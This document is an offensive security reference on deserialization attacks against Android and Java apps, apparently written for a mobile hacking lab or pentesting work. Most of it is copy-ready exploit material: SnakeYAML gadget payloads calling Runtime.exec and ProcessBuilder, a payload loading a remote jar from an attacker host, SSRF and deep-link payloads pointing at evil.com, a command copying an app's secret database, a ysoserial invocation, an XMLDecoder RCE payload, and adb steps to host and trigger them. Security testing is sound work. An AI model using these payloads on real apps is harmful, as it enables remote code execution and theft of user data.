# Deserialization Attacks Reference

When static analysis reveals object deserialization from untrusted input, this is often a direct path to RCE. Mobile apps commonly use YAML, JSON, or Java serialization with unsafe configurations.

## Decision Tree

```
Found deserialization in source?
├── SnakeYAML yaml.load() (no SafeConstructor)?
│   └── Find gadget class with dangerous constructor → RCE
├── Java ObjectInputStream.readObject()?
│   └── Check classpath for known gadgets (Commons Collections, etc.)
├── Gson/Jackson with polymorphic type handling?
│   └── Check for @JsonTypeInfo or RuntimeTypeAdapterFactory
├── XMLDecoder.readObject()?
│   └── Direct RCE — XML can specify arbitrary method calls
└── Android Parcelable/Bundle from untrusted source?
    └── Check for class loading or reflection based on bundle data
```

## Pattern 1: SnakeYAML Unsafe Deserialization (Most Common in MHL)

### Signature in code:
```java
// VULNERABLE — yaml.load() allows arbitrary class instantiation via !! tag
Yaml yaml = new Yaml();
Object data = yaml.load(inputStream);  // or yaml.load(string)

// ALSO VULNERABLE — DumperOptions don't affect loading safety
DumperOptions options = new DumperOptions();
Yaml yaml = new Yaml(options);
Object data = yaml.load(inputStream);
```

### Safe version (not exploitable):
```java
// SAFE — SafeConstructor only allows basic types
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));

// SAFE — loadAs() restricts to specific type
Map<String, Object> data = yaml.loadAs(input, Map.class);
```

### Exploitation:

SnakeYAML's `!!` tag instantiates any class on the classpath. The class needs:
- A public constructor matching the provided arguments
- OR public setters matching the provided properties

#### Single-argument constructor (sequence syntax):
```yaml
!!com.example.app.VulnerableClass ["argument"]
```

#### Multi-argument constructor:
```yaml
!!com.example.app.VulnerableClass ["arg1", "arg2", "arg3"]
```

#### Property-based (mapping syntax):
```yaml
!!com.example.app.VulnerableClass
property1: value1
property2: value2
```

### Common Gadget Classes in Android Apps:

| Gadget Class | Constructor Effect | Payload |
|---|---|---|
| Custom `CommandUtil` / `ShellExec` | `Runtime.exec(command)` | `!!pkg.CommandUtil ["touch /sdcard/pwned"]` |
| `ProcessBuilder` | Starts process | `!!java.lang.ProcessBuilder [["sh", "-c", "id"]]` |
| `java.net.URL` | SSRF (triggers DNS/HTTP) | `!!java.net.URL ["http://attacker.com/"]` |
| `javax.script.ScriptEngineManager` | Loads remote script | `!!javax.script.ScriptEngineManager [{!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]}]` |

### Runtime.exec() Limitations:

`Runtime.exec(String)` uses `StringTokenizer` to split on whitespace. This means:
- ✅ `"touch /sdcard/Download/pwned"` — works (each token is an arg)
- ✅ `"ls /sdcard"` — works
- ❌ `"sh -c 'id > /tmp/out'"` — fails (quotes not interpreted)
- ❌ `"cat /etc/passwd | grep root"` — fails (pipe not interpreted)

**Pitfall: noexec on /data partition**
On modern Android, `/data` is mounted with `noexec`. Scripts pushed to `/data/data/pkg/` or `/sdcard/` will fail with "Permission denied" even if `chmod 755`. Only binaries in `/system/bin/` (like `sh`, `touch`, `cp`, `ls`) can be executed directly.

**Workarounds for shell features:**
1. Push a script to `/data/local/tmp/` (has exec permission on rooted devices):
   ```yaml
   !!pkg.CommandUtil ["/data/local/tmp/script.sh"]
   ```
2. Use `ProcessBuilder` gadget (takes String array):
   ```yaml
   !!java.lang.ProcessBuilder [["sh", "-c", "id > /sdcard/out.txt"]]
   ```
3. Use commands that don't need shell features:
   ```yaml
   !!pkg.CommandUtil ["cp /data/data/pkg/databases/secret.db /sdcard/Download/"]
   ```

### Delivery Vectors:

1. **Intent with URL** — app downloads YAML from attacker server
2. **File picker** — user selects malicious .yml file
3. **Shared storage** — malicious app writes .yml to shared location
4. **Backup/restore** — inject YAML into app backup, restore it
5. **Deep link** — `scheme://host?config=http://evil.com/payload.yml`

### Hosting the Payload:

```bash
# Simple HTTP server (use adb reverse if device can't reach host)
echo '!!com.example.CommandUtil ["touch /sdcard/pwned"]' > /tmp/evil.yml
cd /tmp && python3 -m http.server 8080 &
adb reverse tcp:8080 tcp:8080

# Trigger via intent
adb shell am start -a android.intent.action.VIEW \
  -d "http://127.0.0.1:8080/evil.yml" \
  -t "application/yaml" \
  com.example.app/.MainActivity
```

### Verification:
```bash
# Check if file was created (simplest RCE proof)
adb shell ls -la /sdcard/Download/pwned

# Check logcat for errors if exploit fails
adb logcat -d | grep -i "yaml\|constructor\|error\|exception" | tail -20
```

## Pattern 2: Java ObjectInputStream

### Signature:
```java
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  // DANGEROUS
```

### Exploitation:
Requires known gadget chains on classpath. Check for:
- Apache Commons Collections (`InvokerTransformer`)
- Spring Framework (`MethodInvokeTypeProvider`)
- Groovy (`MethodClosure`)

Use ysoserial to generate payloads:
```bash
java -jar ysoserial.jar CommonsCollections1 "touch /sdcard/pwned" > payload.bin
```

### Android-specific note:
Most Android apps don't have classic Java gadget libraries. Look for:
- Custom `Serializable` classes with dangerous `readObject()` methods
- `Parcelable` classes that perform reflection or class loading

## Pattern 3: Gson/Jackson Polymorphic Deserialization

### Signature (Jackson):
```java
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  // DANGEROUS
public class BaseConfig { ... }

ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // DANGEROUS — allows any class
BaseConfig config = mapper.readValue(json, BaseConfig.class);
```

### Signature (Gson with RuntimeTypeAdapterFactory):
```java
RuntimeTypeAdapterFactory<Base> factory = RuntimeTypeAdapterFactory.of(Base.class)
    .registerSubtype(SubA.class)
    .registerSubtype(SubB.class);
// Less dangerous — restricted to registered subtypes
// But check if any registered subtype has dangerous behavior
```

### Exploitation:
```json
{"@class": "com.example.DangerousClass", "command": "touch /sdcard/pwned"}
```

## Pattern 4: XMLDecoder (Rare in Mobile, Common in Java Web)

### Signature:
```java
XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject();  // DIRECT RCE
```

### Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <string>touch /sdcard/pwned</string>
    </void>
  </object>
</java>
```

## Pattern 5: Android Intent/Bundle Deserialization

### Signature:
```java
// Receiving serializable extra from untrusted intent
Intent intent = getIntent();
Object data = intent.getSerializableExtra("config");  // If attacker controls intent
```

### Exploitation:
Craft a malicious app that sends an intent with a serialized gadget object:
```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("target.pkg", "target.pkg.VulnActivity"));
intent.putExtra("config", maliciousSerializableObject);
startActivity(intent);
```

## Checklist for Static Analysis

When you find deserialization:
1. ☐ What library? (SnakeYAML, Jackson, Gson, Java native, XMLDecoder)
2. ☐ Is it using safe mode? (SafeConstructor, loadAs, disabled default typing)
3. ☐ Where does input come from? (network, file, intent, user input)
4. ☐ What classes are on the classpath? (search for dangerous constructors/methods)
5. ☐ Can attacker control the input? (exported component, URL handler, file picker)
6. ☐ Is there a gadget class? (Runtime.exec, ProcessBuilder, file write, SSRF)

## Reporting

Document:
1. **Deserialization library and method** (e.g., SnakeYAML yaml.load())
2. **Input source** (how attacker delivers payload)
3. **Gadget class** (what gets instantiated and why it's dangerous)
4. **Full exploit payload** (ready to copy-paste)
5. **Delivery mechanism** (intent, URL, file)
6. **Impact** (RCE, file read/write, SSRF)
